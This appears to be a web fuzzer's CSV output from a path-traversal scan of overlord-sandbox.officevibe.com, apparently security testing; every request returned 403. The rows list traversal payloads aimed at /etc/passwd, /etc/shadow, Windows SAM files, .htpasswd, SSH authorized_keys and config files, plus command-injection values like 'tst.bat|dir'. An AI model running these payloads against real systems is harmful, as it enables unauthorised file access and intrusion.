FUZZ,url,redirectlocation,position,status_code,content_length,content_words,content_lines,content_type,duration,resultfile
%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd,https://overlord-sandbox.officevibe.com/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd,,99682,403,312,17,7,text/html; charset=us-ascii,28.543115ms,
../html,https://overlord-sandbox.officevibe.com/../html,,100072,403,312,17,7,text/html; charset=us-ascii,31.651634ms,
../config.php,https://overlord-sandbox.officevibe.com/../config.php,,102518,403,312,17,7,text/html; charset=us-ascii,28.317897ms,
jreport/sendfile/help/../../../../../../../../../../../../../../etc/passwd,https://overlord-sandbox.officevibe.com/jreport/sendfile/help/../../../../../../../../../../../../../../etc/passwd,,104832,403,312,17,7,text/html; charset=us-ascii,28.426996ms,
res/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,https://overlord-sandbox.officevibe.com/res/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,,107746,403,312,17,7,text/html; charset=us-ascii,27.752663ms,
../users.db.php,https://overlord-sandbox.officevibe.com/../users.db.php,,108705,403,312,17,7,text/html; charset=us-ascii,27.325237ms,
../apache/logs/error.log,https://overlord-sandbox.officevibe.com/../apache/logs/error.log,,108758,403,312,17,7,text/html; charset=us-ascii,28.103062ms,
my_keys&dst=../../../root/.ssh/authorized_keys,https://overlord-sandbox.officevibe.com/my_keys&dst=../../../root/.ssh/authorized_keys,,109041,403,312,17,7,text/html; charset=us-ascii,29.926346ms,
signEzUI/playlist/edit/upload/../../../../../../../../../../etc/passwd,https://overlord-sandbox.officevibe.com/signEzUI/playlist/edit/upload/../../../../../../../../../../etc/passwd,,111191,403,312,17,7,text/html; charset=us-ascii,30.468211ms,
ca/..\\..\\..\\..\\..\\..\\..\\..\\winnt/\\win.ini,https://overlord-sandbox.officevibe.com/ca/..\\..\\..\\..\\..\\..\\..\\..\\winnt/\\win.ini,,112444,403,312,17,7,text/html; charset=us-ascii,28.393564ms,
votes/../../admin/multiuser/multiuser.php,https://overlord-sandbox.officevibe.com/votes/../../admin/multiuser/multiuser.php,,112576,403,312,17,7,text/html; charset=us-ascii,27.809022ms,
ca/..\\..\\..\\..\\..\\..\\/\\etc/\\passwd,https://overlord-sandbox.officevibe.com/ca/..\\..\\..\\..\\..\\..\\/\\etc/\\passwd,,114224,403,312,17,7,text/html; charset=us-ascii,27.950877ms,
../../proc,https://overlord-sandbox.officevibe.com/../../proc,,125026,403,312,17,7,text/html; charset=us-ascii,27.690452ms,
[SecCheck]/..%2f../ext.ini,https://overlord-sandbox.officevibe.com/[SecCheck]/..%2f../ext.ini,,127572,403,312,17,7,text/html; charset=us-ascii,28.742766ms,
admin/../../../file/to/view,https://overlord-sandbox.officevibe.com/admin/../../../file/to/view,,128723,403,312,17,7,text/html; charset=us-ascii,27.97974ms,
../../../../etc/passwd,https://overlord-sandbox.officevibe.com/../../../../etc/passwd,,130010,403,312,17,7,text/html; charset=us-ascii,28.984959ms,
"tst.bat|dir%20..\\..\\..\\..\\..\\..\\..\\..\\,","https://overlord-sandbox.officevibe.com/tst.bat|dir%20..\\..\\..\\..\\..\\..\\..\\..\\,",,134096,403,312,17,7,text/html; charset=us-ascii,32.985263ms,
../../../../../etc/passwd,https://overlord-sandbox.officevibe.com/../../../../../etc/passwd,,134649,403,312,17,7,text/html; charset=us-ascii,30.003769ms,
../../var/www/logs/access_log,https://overlord-sandbox.officevibe.com/../../var/www/logs/access_log,,136450,403,312,17,7,text/html; charset=us-ascii,31.284087ms,
NUL/../../../../../../../../../WINNT/system32/ipconfig.exe,https://overlord-sandbox.officevibe.com/NUL/../../../../../../../../../WINNT/system32/ipconfig.exe,,137428,403,312,17,7,text/html; charset=us-ascii,27.964668ms,
../../../../pswd,https://overlord-sandbox.officevibe.com/../../../../pswd,,139151,403,312,17,7,text/html; charset=us-ascii,28.041471ms,
../../..//etc/passwd,https://overlord-sandbox.officevibe.com/../../..//etc/passwd,,145383,403,312,17,7,text/html; charset=us-ascii,28.096795ms,
../../../../../../../../../../etc/passwd,https://overlord-sandbox.officevibe.com/../../../../../../../../../../etc/passwd,,149904,403,312,17,7,text/html; charset=us-ascii,28.065564ms,
\..\..\..\..\..\..\..\..\..\etc\passwd,https://overlord-sandbox.officevibe.com/\..\..\..\..\..\..\..\..\..\etc\passwd,,149962,403,312,17,7,text/html; charset=us-ascii,28.451451ms,
..%2F..%2F..%2F..%2F..%2F../winnt/repair/sam._,https://overlord-sandbox.officevibe.com/..%2F..%2F..%2F..%2F..%2F../winnt/repair/sam._,,150077,403,312,17,7,text/html; charset=us-ascii,28.04884ms,
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini,https://overlord-sandbox.officevibe.com/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini,,150783,403,312,17,7,text/html; charset=us-ascii,29.070961ms,
../logs/error.log,https://overlord-sandbox.officevibe.com/../logs/error.log,,150787,403,312,17,7,text/html; charset=us-ascii,47.070899ms,
../_config.php,https://overlord-sandbox.officevibe.com/../_config.php,,152532,403,312,17,7,text/html; charset=us-ascii,27.859847ms,
%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../boot.ini,https://overlord-sandbox.officevibe.com/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../boot.ini,,152732,403,312,17,7,text/html; charset=us-ascii,28.071014ms,
../../../../winnt/repair/sam._,https://overlord-sandbox.officevibe.com/../../../../winnt/repair/sam._,,152901,403,312,17,7,text/html; charset=us-ascii,27.80998ms,
//./../.../boot.ini,https://overlord-sandbox.officevibe.com///./../.../boot.ini,,154859,403,312,17,7,text/html; charset=us-ascii,27.545842ms,
../.htaccess,https://overlord-sandbox.officevibe.com/../.htaccess,,154866,403,312,17,7,text/html; charset=us-ascii,27.954011ms,
a\..\..\muster.db,https://overlord-sandbox.officevibe.com/a\..\..\muster.db,,155201,403,312,17,7,text/html; charset=us-ascii,28.000807ms,
./../../../../../../../../../../etc/passwd,https://overlord-sandbox.officevibe.com/./../../../../../../../../../../etc/passwd,,158810,403,312,17,7,text/html; charset=us-ascii,28.74642ms,
../etc/passwd,https://overlord-sandbox.officevibe.com/../etc/passwd,,161332,403,312,17,7,text/html; charset=us-ascii,27.621621ms,
../../../apache/logs/access.log,https://overlord-sandbox.officevibe.com/../../../apache/logs/access.log,,165596,403,312,17,7,text/html; charset=us-ascii,28.506856ms,
RASHTML5Gateway//..\\\..\\\..\\\..\\\..\\\windows\win.ini,https://overlord-sandbox.officevibe.com/RASHTML5Gateway//..\\\..\\\..\\\..\\\..\\\windows\win.ini,,168885,403,312,17,7,text/html; charset=us-ascii,28.424766ms,
./../../../../../../../../../../etc/shadow,https://overlord-sandbox.officevibe.com/./../../../../../../../../../../etc/shadow,,170300,403,312,17,7,text/html; charset=us-ascii,29.830505ms,
../config.dat,https://overlord-sandbox.officevibe.com/../config.dat,,175059,403,312,17,7,text/html; charset=us-ascii,27.901699ms,
../apache/logs/access.log,https://overlord-sandbox.officevibe.com/../apache/logs/access.log,,175197,403,312,17,7,text/html; charset=us-ascii,28.316169ms,
../www,https://overlord-sandbox.officevibe.com/../www,,175254,403,312,17,7,text/html; charset=us-ascii,27.531986ms,
../config.asp,https://overlord-sandbox.officevibe.com/../config.asp,,179031,403,312,17,7,text/html; charset=us-ascii,27.810416ms,
./.././..//etc/passwd,https://overlord-sandbox.officevibe.com/./.././..//etc/passwd,,181131,403,312,17,7,text/html; charset=us-ascii,41.816989ms,
..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cboot.ini,https://overlord-sandbox.officevibe.com/..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cboot.ini,,183471,403,312,17,7,text/html; charset=us-ascii,28.214898ms,
error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini,https://overlord-sandbox.officevibe.com/error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini,,186200,403,312,17,7,text/html; charset=us-ascii,29.283085ms,
../.htpasswd,https://overlord-sandbox.officevibe.com/../.htpasswd,,186603,403,312,17,7,text/html; charset=us-ascii,28.421449ms,
lib/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,https://overlord-sandbox.officevibe.com/lib/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,,188596,403,312,17,7,text/html; charset=us-ascii,29.174443ms,
../..//etc/passwd,https://overlord-sandbox.officevibe.com/../..//etc/passwd,,193029,403,312,17,7,text/html; charset=us-ascii,27.791434ms,
static/../../../../windows/win.ini,https://overlord-sandbox.officevibe.com/static/../../../../windows/win.ini,,201012,403,312,17,7,text/html; charset=us-ascii,28.078359ms,
%2e%2e//google.com,https://overlord-sandbox.officevibe.com/%2e%2e//google.com,,202957,403,312,17,7,text/html; charset=us-ascii,28.633423ms,
../../../..//etc/passwd;index.html,https://overlord-sandbox.officevibe.com/../../../..//etc/passwd;index.html,,203432,403,312,17,7,text/html; charset=us-ascii,35.976842ms,
modx/assets/cache/docid_1/../../../../../../../etc/passwd\0.pageCache.php,https://overlord-sandbox.officevibe.com/modx/assets/cache/docid_1/../../../../../../../etc/passwd\0.pageCache.php,,206747,403,312,17,7,text/html; charset=us-ascii,27.915709ms,
/./../.../boot.ini,https://overlord-sandbox.officevibe.com//./../.../boot.ini,,208978,403,312,17,7,text/html; charset=us-ascii,29.465168ms,
../config.inc.php,https://overlord-sandbox.officevibe.com/../config.inc.php,,211520,403,312,17,7,text/html; charset=us-ascii,27.566344ms,
../manager/html,https://overlord-sandbox.officevibe.com/../manager/html,,213723,403,312,17,7,text/html; charset=us-ascii,28.25098ms,
../../../../apache/logs/access.log,https://overlord-sandbox.officevibe.com/../../../../apache/logs/access.log,,214776,403,312,17,7,text/html; charset=us-ascii,28.271473ms,
../admim,https://overlord-sandbox.officevibe.com/../admim,,217845,403,312,17,7,text/html; charset=us-ascii,27.83527ms,
..%2F..%2F..%2F..%2F..%2F../windows/repair/sam,https://overlord-sandbox.officevibe.com/..%2F..%2F..%2F..%2F..%2F../windows/repair/sam,,218082,403,312,17,7,text/html; charset=us-ascii,28.110094ms,
../../../../logs/access.log,https://overlord-sandbox.officevibe.com/../../../../logs/access.log,,222807,403,312,17,7,text/html; charset=us-ascii,28.148937ms,
js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,https://overlord-sandbox.officevibe.com/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,,224364,403,312,17,7,text/html; charset=us-ascii,28.730485ms,
"alibaba.pl|dir%20..\\..\\..\\..\\..\\..\\..\\,","https://overlord-sandbox.officevibe.com/alibaba.pl|dir%20..\\..\\..\\..\\..\\..\\..\\,",,226017,403,312,17,7,text/html; charset=us-ascii,31.167676ms,
../../etc/passwd,https://overlord-sandbox.officevibe.com/../../etc/passwd,,226249,403,312,17,7,text/html; charset=us-ascii,28.140249ms,
static/..%5c..%5c..%5c..%5cetc/passwd,https://overlord-sandbox.officevibe.com/static/..%5c..%5c..%5c..%5cetc/passwd,,226291,403,312,17,7,text/html; charset=us-ascii,28.05688ms,
//////../../../../../../etc/passwd,https://overlord-sandbox.officevibe.com///////../../../../../../etc/passwd,,226989,403,312,17,7,text/html; charset=us-ascii,29.219094ms,
"cgi-bin/tst.bat|dir%20..\\..\\..\\..\\..\\..\\..\\..\\,","https://overlord-sandbox.officevibe.com/cgi-bin/tst.bat|dir%20..\\..\\..\\..\\..\\..\\..\\..\\,",,228125,403,312,17,7,text/html; charset=us-ascii,29.578814ms,
../../data/config/microsrv.cfg,https://overlord-sandbox.officevibe.com/../../data/config/microsrv.cfg,,228343,403,312,17,7,text/html; charset=us-ascii,38.405674ms,
../../..//etc/passwd;index.html,https://overlord-sandbox.officevibe.com/../../..//etc/passwd;index.html,,233973,403,312,17,7,text/html; charset=us-ascii,27.545069ms,
../..//etc/passwd;index.html,https://overlord-sandbox.officevibe.com/../..//etc/passwd;index.html,,239233,403,312,17,7,text/html; charset=us-ascii,28.276062ms,
%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini,https://overlord-sandbox.officevibe.com/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini,,241360,403,312,17,7,text/html; charset=us-ascii,27.988179ms,
..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,https://overlord-sandbox.officevibe.com/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,,243557,403,312,17,7,text/html; charset=us-ascii,28.137776ms,
../../../../../../../../../boot.ini,https://overlord-sandbox.officevibe.com/../../../../../../../../../boot.ini,,245648,403,312,17,7,text/html; charset=us-ascii,28.247869ms,
../console,https://overlord-sandbox.officevibe.com/../console,,250034,403,312,17,7,text/html; charset=us-ascii,28.195917ms,
../../windows/win.ini,https://overlord-sandbox.officevibe.com/../../windows/win.ini,,253997,403,312,17,7,text/html; charset=us-ascii,31.374171ms,
../../../administrator/inbox,https://overlord-sandbox.officevibe.com/../../../administrator/inbox,,255033,403,312,17,7,text/html; charset=us-ascii,27.749001ms,
static/..%5c..%5c..%5c..%5c..%5cetc/passwd,https://overlord-sandbox.officevibe.com/static/..%5c..%5c..%5c..%5c..%5cetc/passwd,,255283,403,312,17,7,text/html; charset=us-ascii,27.673397ms,
dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole,https://overlord-sandbox.officevibe.com/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole,,258795,403,312,17,7,text/html; charset=us-ascii,35.039588ms,
../../../../logs/error.log,https://overlord-sandbox.officevibe.com/../../../../logs/error.log,,259632,403,312,17,7,text/html; charset=us-ascii,28.144801ms,
../../.htaccess,https://overlord-sandbox.officevibe.com/../../.htaccess,,263185,403,312,17,7,text/html; charset=us-ascii,27.647886ms,
..%5c..%5c..%5cetc/passwd,https://overlord-sandbox.officevibe.com/..%5c..%5c..%5cetc/passwd,,263409,403,312,17,7,text/html; charset=us-ascii,27.948001ms,
../../../apache/logs/error.log,https://overlord-sandbox.officevibe.com/../../../apache/logs/error.log,,265724,403,312,17,7,text/html; charset=us-ascii,28.767758ms,
../../../..//etc/passwd,https://overlord-sandbox.officevibe.com/../../../..//etc/passwd,,266700,403,312,17,7,text/html; charset=us-ascii,28.991313ms,
../logs/access.log,https://overlord-sandbox.officevibe.com/../logs/access.log,,270935,403,312,17,7,text/html; charset=us-ascii,27.611089ms,
DomainFiles/*//../../../../../../../../../../etc/passwd,https://overlord-sandbox.officevibe.com/DomainFiles/*//../../../../../../../../../../etc/passwd,,273573,403,312,17,7,text/html; charset=us-ascii,28.042857ms,
../agc/bp.pl,https://overlord-sandbox.officevibe.com/../agc/bp.pl,,276301,403,312,17,7,text/html; charset=us-ascii,27.527205ms,
../install.php,https://overlord-sandbox.officevibe.com/../install.php,,279316,403,312,17,7,text/html; charset=us-ascii,27.51492ms,
./..//etc/passwd,https://overlord-sandbox.officevibe.com/./..//etc/passwd,,281572,403,312,17,7,text/html; charset=us-ascii,27.435034ms,
.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/var/www/html/index.html,https://overlord-sandbox.officevibe.com/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/var/www/html/index.html,,282407,403,312,17,7,text/html; charset=us-ascii,27.789365ms,
